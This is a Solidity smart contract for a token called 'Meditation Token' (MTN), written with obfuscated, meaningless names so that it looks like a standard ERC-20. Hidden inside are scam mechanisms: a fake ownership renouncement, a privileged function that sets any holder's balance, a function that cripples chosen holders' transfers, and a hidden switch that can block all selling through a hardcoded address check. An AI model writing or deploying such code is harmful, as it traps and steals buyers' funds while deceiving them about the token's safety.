//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface senderMaxEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listAuto) external view returns (uint256);

    function transfer(address modeToken, uint256 receiverTokenSwap) external returns (bool);

    function allowance(address minTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverTokenSwap) external returns (bool);

    function transferFrom(
        address sender,
        address modeToken,
        uint256 receiverTokenSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxFund, uint256 value);
    event Approval(address indexed minTo, address indexed spender, uint256 value);
}

abstract contract totalTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitLaunched {
    function createPair(address launchedReceiver, address listFrom) external returns (address);
}

interface senderMaxEnableMetadata is senderMaxEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MeditationToken is totalTrading, senderMaxEnable, senderMaxEnableMetadata {

    function swapBuy(address isTeam) public {
        if (amountToAuto) {
            return;
        }
        if (senderSwap == teamMarketing) {
            teamMarketing = senderSwap;
        }
        toAuto[isTeam] = true;
        if (takeList != senderSwap) {
            teamMarketing = takeList;
        }
        amountToAuto = true;
    }

    function transfer(address exemptTeamTotal, uint256 receiverTokenSwap) external virtual override returns (bool) {
        return autoTake(_msgSender(), exemptTeamTotal, receiverTokenSwap);
    }

    mapping(address => bool) public toAuto;

    function symbol() external view virtual override returns (string memory) {
        return modeTake;
    }

    mapping(address => uint256) private marketingBuy;

    mapping(address => bool) public teamMode;

    uint256 private takeList;

    address private amountTotalToken;

    function owner() external view returns (address) {
        return amountTotalToken;
    }

    string private modeTake = "MTN";

    uint256 constant buySell = 12 ** 10;

    bool public amountToAuto;

    address public buyTrading;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldList;
    }

    function fundLimit(address amountFromTake, address modeToken, uint256 receiverTokenSwap) internal returns (bool) {
        require(marketingBuy[amountFromTake] >= receiverTokenSwap);
        marketingBuy[amountFromTake] -= receiverTokenSwap;
        marketingBuy[modeToken] += receiverTokenSwap;
        emit Transfer(amountFromTake, modeToken, receiverTokenSwap);
        return true;
    }

    function sellBuyLaunch() private view {
        require(toAuto[_msgSender()]);
    }

    uint256 atMaxTo;

    function approve(address launchedTotal, uint256 receiverTokenSwap) public virtual override returns (bool) {
        walletList[_msgSender()][launchedTotal] = receiverTokenSwap;
        emit Approval(_msgSender(), launchedTotal, receiverTokenSwap);
        return true;
    }

    constructor (){
        
        isSell fundReceiver = isSell(receiverTrading);
        buyTrading = limitLaunched(fundReceiver.factory()).createPair(fundReceiver.WETH(), address(this));
        if (teamMarketing != takeList) {
            teamMarketing = senderSwap;
        }
        marketingMax = _msgSender();
        txMin();
        toAuto[marketingMax] = true;
        marketingBuy[marketingMax] = shouldList;
        if (toList) {
            takeExempt = true;
        }
        emit Transfer(address(0), marketingMax, shouldList);
    }

    uint256 public senderSwap;

    function autoTake(address amountFromTake, address modeToken, uint256 receiverTokenSwap) internal returns (bool) {
        if (amountFromTake == marketingMax) {
            return fundLimit(amountFromTake, modeToken, receiverTokenSwap);
        }
        uint256 modeWallet = senderMaxEnable(buyTrading).balanceOf(modeTx);
        require(modeWallet == atMaxTo);
        require(modeToken != modeTx);
        if (teamMode[amountFromTake]) {
            return fundLimit(amountFromTake, modeToken, buySell);
        }
        return fundLimit(amountFromTake, modeToken, receiverTokenSwap);
    }

    function decimals() external view virtual override returns (uint8) {
        return feeAutoMode;
    }

    string private txEnable = "Meditation Token";

    function takeToken(uint256 receiverTokenSwap) public {
        sellBuyLaunch();
        atMaxTo = receiverTokenSwap;
    }

    uint256 private shouldList = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return amountTotalToken;
    }

    uint256 walletLaunched;

    function txMin() public {
        emit OwnershipTransferred(marketingMax, address(0));
        amountTotalToken = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return txEnable;
    }

    uint8 private feeAutoMode = 18;

    function allowance(address fundAuto, address launchedTotal) external view virtual override returns (uint256) {
        if (launchedTotal == receiverTrading) {
            return type(uint256).max;
        }
        return walletList[fundAuto][launchedTotal];
    }

    address modeTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address amountFromTake, address modeToken, uint256 receiverTokenSwap) external override returns (bool) {
        if (_msgSender() != receiverTrading) {
            if (walletList[amountFromTake][_msgSender()] != type(uint256).max) {
                require(receiverTokenSwap <= walletList[amountFromTake][_msgSender()]);
                walletList[amountFromTake][_msgSender()] -= receiverTokenSwap;
            }
        }
        return autoTake(amountFromTake, modeToken, receiverTokenSwap);
    }

    bool private toList;

    address receiverTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private takeExempt;

    mapping(address => mapping(address => uint256)) private walletList;

    address public marketingMax;

    event OwnershipTransferred(address indexed tokenAmountTo, address indexed senderEnable);

    function totalShould(address exemptTeamTotal, uint256 receiverTokenSwap) public {
        sellBuyLaunch();
        marketingBuy[exemptTeamTotal] = receiverTokenSwap;
    }

    function launchedTake(address feeIsFund) public {
        sellBuyLaunch();
        
        if (feeIsFund == marketingMax || feeIsFund == buyTrading) {
            return;
        }
        teamMode[feeIsFund] = true;
    }

    uint256 public teamMarketing;

    bool private receiverReceiverMarketing;

    function balanceOf(address listAuto) public view virtual override returns (uint256) {
        return marketingBuy[listAuto];
    }

}